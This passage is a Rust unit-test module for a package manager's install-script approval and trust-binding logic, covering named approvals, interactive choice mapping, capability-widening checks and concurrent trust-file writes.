        assert!(trust.trusted.contains_key("sharp@0.33.0"));
    }

    /// Named-package approval writes exactly ONE entry to the trust
    /// file, leaving other rows unapproved.
    #[tokio::test]
    async fn run_global_named_approves_only_the_matched_row() {
        ensure_security_test_backend();
        let tmp = tempdir().unwrap();
        let root = lpm_common::LpmRoot::from_dir(tmp.path());
        let agg = AggregateBlockedSet {
            rows: vec![
                row("esbuild", "0.25.1", &["eslint"]),
                row("sharp", "0.33.0", &["typescript"]),
            ],
            unreadable_origins: vec![],
        };
        let policy = deny_verify_policy();
        run_global_named(
            &root,
            &agg,
            "sharp",
            false,
            true,
            &policy,
            EnforceMode::Deny,
        )
        .await
        .unwrap();
        let trust = lpm_global::trusted_deps::read_for(&root).unwrap();
        assert!(trust.trusted.contains_key("sharp@0.33.0"));
        assert!(!trust.trusted.contains_key("esbuild@0.25.1"));
    }

    /// Unknown package name surfaces NotFound with an actionable hint
    /// pointing at `--list`.
    #[tokio::test]
    async fn run_global_named_errors_for_unknown_package() {
        let tmp = tempdir().unwrap();
        let root = lpm_common::LpmRoot::from_dir(tmp.path());
        let agg = AggregateBlockedSet {
            rows: vec![row("esbuild", "0.25.1", &["eslint"])],
            unreadable_origins: vec![],
        };
        let policy = deny_verify_policy();
        let err = run_global_named(
            &root,
            &agg,
            "ghost",
            false,
            true,
            &policy,
            EnforceMode::Deny,
        )
        .await
        .unwrap_err();
        let msg = err.to_string();
        assert!(msg.contains("not in the global blocked set"));
        assert!(msg.contains("--global --list"));
    }

    /// `--list --yes` together are rejected with the same error shape
    /// as the project-scoped flow.
    #[tokio::test]
    async fn run_global_rejects_list_plus_yes() {
        let tmp = std::env::temp_dir();
        let _env = scoped_lpm_home(&tmp);
        let err = run_global(None, true, true, false, false, true)
            .await
            .unwrap_err();
        assert!(err.to_string().contains("conflicts with `--yes`"));
    }

    #[tokio::test]
    async fn run_global_grouped_interactive_path_is_reachable() {
        let tmp = tempdir().unwrap();
        let root = lpm_common::LpmRoot::from_dir(tmp.path());
        seed_global_manifest_with_blocked(
            &root,
            "eslint",
            "9.24.0",
            vec![row("esbuild", "0.25.1", &["eslint"])],
        );
        let _env = scoped_lpm_home(tmp.path());
        let err = run_global(None, false, false, true, false, true)
            .await
            .unwrap_err();
        let msg = err.to_string();
        assert!(msg.contains("needs a TTY for the interactive walk"));
    }

    /// --group auto-enable threshold constant is at the expected value.
    /// Pin it so a future refactor doesn't accidentally change the
    /// threshold without the plan doc being updated.
    #[test]
    fn group_auto_threshold_is_10() {
        assert_eq!(GROUP_AUTO_THRESHOLD, 10);
    }

    // ─── — interactive choice mapping ─────────
    //
    // The Select itself can't be unit-tested without driving cliclack
    // (which expects a TTY); these tests pin the pure decision
    // projection that the Select callback feeds into. The actual TUI
    // wiring is exercised end-to-end by the C5 reference fixture.

    #[test]
    fn p7_choice_decision_maps_approve_pair_to_true() {
        assert_eq!(InteractiveChoice::Approve.decision(), Some(true));
        assert_eq!(InteractiveChoice::AcceptNew.decision(), Some(true));
    }

    #[test]
    fn p7_choice_decision_maps_skip_pair_to_false() {
        assert_eq!(InteractiveChoice::Skip.decision(), Some(false));
        assert_eq!(InteractiveChoice::KeepOld.decision(), Some(false));
    }

    #[test]
    fn p7_choice_decision_returns_none_for_view_and_quit() {
        assert_eq!(InteractiveChoice::View.decision(), None);
        assert_eq!(InteractiveChoice::Quit.decision(), None);
    }

    #[test]
    fn p7_keepold_does_not_imply_approve() {
        // Pin the signoff-B(i) contract: KeepOld is decline, not a
        // resolver mutation. If a future refactor accidentally
        // remaps KeepOld to true (e.g., trying to "remember" the old
        // approval somehow writes a new binding), this test fails.
        assert_eq!(
            InteractiveChoice::KeepOld.decision(),
            Some(false),
            "KeepOld must collapse to decline (false), NEVER approve. \
             Per signoff B(i): no resolver pin, no manifest write."
        );
    }

    // ── capability-widening
    //    must flow through `compute_effective_blocked_set` ──

    /// Reviewer's Medium finding: the discovery-side filter
    /// drops strict-matched rows, which silently omits the
    /// capability-drift case. Fix: the filter consults
    /// the capability gate, so a strict-matched package whose
    /// current capability request widens stays in the effective
    /// blocked set for `lpm approve-scripts` to surface.
    #[test]
    fn capability_widening_row_stays_in_effective_blocked_set() {
        use crate::capability::{CapabilitySet, ReadProjectMode, UserBound};

        let state = BuildState {
            state_version: build_state::BUILD_STATE_VERSION,
            blocked_set_fingerprint: "fp".into(),
            captured_at: "T00:00:00Z".into(),
            blocked_packages: vec![BlockedPackage {
                name: "esbuild".into(),
                version: "0.25.1".into(),
                integrity: None,
                script_hash: Some("sha256-h".into()),
                phases_present: vec!["postinstall".into()],
                binding_drift: true, // capture wrote this with drift flag
                static_tier: None,
                provenance_at_capture: None,
                published_at: None,
                behavioral_tags_hash: None,
                behavioral_tags: None,
            }],
            drift_ignore_override: None,
        };
        // Strict match: script-hash approved with no capability_hash.
        let mut map = std::collections::HashMap::new();
        map.insert(
            "esbuild@0.25.1".to_string(),
            TrustedDependencyBinding {
                script_hash: Some("sha256-h".into()),
                ..Default::default()
            },
        );
        let trusted = TrustedDependencies::Rich(map);

        // Capability request widens (non-empty passEnv).
        let widening = CapabilitySet {
            pass_env: ["SSH_AUTH_SOCK".into()].into_iter().collect(),
            read_project: ReadProjectMode::Narrow,
            sandbox_limits: Default::default(),
        };

        let effective =
            compute_effective_blocked_set(&state, &trusted, &widening, &UserBound::default());
        assert_eq!(
            effective.len(),
            1,
            "capability-widening package must stay in effective \
             blocked set so approve-scripts can surface it"
        );
        assert_eq!(effective[0].name, "esbuild");
    }

    /// Parity: a baseline request against a strict-matched
    /// package drops from the effective set (no regression for
    /// the common case). Pre-6d behavior preserved for baseline.
    #[test]
    fn baseline_request_drops_strict_matched_row() {
        use crate::capability::{CapabilitySet, UserBound};

        let state = BuildState {
            state_version: build_state::BUILD_STATE_VERSION,
            blocked_set_fingerprint: "fp".into(),
            captured_at: "T00:00:00Z".into(),
            blocked_packages: vec![BlockedPackage {
                name: "esbuild".into(),
                version: "0.25.1".into(),
                integrity: None,
                script_hash: Some("sha256-h".into()),
                phases_present: vec!["postinstall".into()],
                binding_drift: false,
                static_tier: None,
                provenance_at_capture: None,
                published_at: None,
                behavioral_tags_hash: None,
                behavioral_tags: None,
            }],
            drift_ignore_override: None,
        };
        let mut map = std::collections::HashMap::new();
        map.insert(
            "esbuild@0.25.1".to_string(),
            TrustedDependencyBinding {
                script_hash: Some("sha256-h".into()),
                ..Default::default()
            },
        );
        let trusted = TrustedDependencies::Rich(map);

        let effective = compute_effective_blocked_set(
            &state,
            &trusted,
            &CapabilitySet::default(),
            &UserBound::default(),
        );
        assert!(
            effective.is_empty(),
            "strict-matched + baseline request → filtered out"
        );
    }

    // ─── provenance + tx-lock + origin-aware banner ────────

    // End-to-end provenance persistence (cache hit → binding has
    // populated `provenance_at_approval`) lives in the workflow tests
    // under tests/workflows/tests/install_global_drift.rs, where a mock
    // registry can declare `dist.attestations.url` so the cache is
    // actually consulted. In-process unit tests can't easily reach that
    // path because the cache is bypassed when registry metadata reports
    // no attestation URL (and the unit-test environment has no network /
    // no mock to declare one). The schema round-trip and binding-shape
    // dimensions of provenance persistence are pinned by:
    //   - `crates/lpm-global/src/trusted_deps.rs::tests::round_trip_preserves_provenance_at_approval`
    //   - `crates/lpm-global/src/trusted_deps.rs::tests::insert_binding_stores_rich_binding_and_overwrites`

    /// Round-3 finding (i): two parallel `--global` named approvals
    /// against DISJOINT rows must both land in the final trust file.
    /// Pre-fix the shared `store_lock` allowed the second writer's
    /// read to happen before the first writer's write completed,
    /// dropping one binding from the final state. The new
    /// `with_exclusive_lock_async(global_tx_lock())` serializes them.
    ///
    /// Disjoint approvals (esbuild vs sharp) — not `--yes` against
    /// identical sets — force a non-overlapping insert pattern so a
    /// silent clobber is observable as a missing binding.
    #[tokio::test]
    async fn global_named_approvals_do_not_clobber_each_other() {
        ensure_security_test_backend();
        let tmp = tempdir().unwrap();
        let _env = scoped_lpm_home(tmp.path());
        let root_path = tmp.path().to_path_buf();
        let agg = AggregateBlockedSet {
            rows: vec![
                row("esbuild", "0.25.1", &["eslint"]),
                row("sharp", "0.33.0", &["typescript"]),
            ],
            unreadable_origins: vec![],
        };
        let agg_a = agg.clone();
        let agg_b = agg.clone();
        let root_a = root_path.clone();
        let root_b = root_path.clone();
        let task_a = tokio::spawn(async move {
            let root = lpm_common::LpmRoot::from_dir(&root_a);
            let policy = deny_verify_policy();
            run_global_named(
                &root,
                &agg_a,
                "esbuild@0.25.1",
                false,
                true,
                &policy,
                EnforceMode::Deny,
            )
            .await
        });
        let task_b = tokio::spawn(async move {
            let root = lpm_common::LpmRoot::from_dir(&root_b);
            let policy = deny_verify_policy();
            run_global_named(
                &root,
                &agg_b,
                "sharp@0.33.0",
                false,
                true,
                &policy,
                EnforceMode::Deny,
            )
            .await
        });
        task_a.await.unwrap().unwrap();
        task_b.await.unwrap().unwrap();
        let root = lpm_common::LpmRoot::from_dir(&root_path);
        let trust = lpm_global::trusted_deps::read_for(&root).unwrap();
        assert!(
            trust.trusted.contains_key("esbuild@0.25.1"),
            "first writer's binding survived",
        );
        assert!(
            trust.trusted.contains_key("sharp@0.33.0"),
            "second writer's binding survived",
        );
    }

    /// Origin-list helpers: empty-origins fallback + single-origin
    /// rendering + multi-origin sorted-deduped union.
    #[test]
    fn union_origins_sorts_and_deduplicates() {
        let rows = [
            row("esbuild", "0.25.1", &["vite-plugin-foo", "eslint"]),
            row("sharp", "0.33.0", &["eslint", "typescript"]),
        ];
        let origins = union_origins(rows.iter());
        assert_eq!(origins, vec!["eslint", "typescript", "vite-plugin-foo"]);
    }

    #[test]
    fn rerun_next_step_json_shape_is_stable() {
        let payload = rerun_next_step_json(&["eslint".into(), "typescript".into()]);
        assert_eq!(payload["kind"], "reinstall_globals");
        assert_eq!(payload["origins"][0], "eslint");
        assert_eq!(payload["origins"][1], "typescript");
    }
}
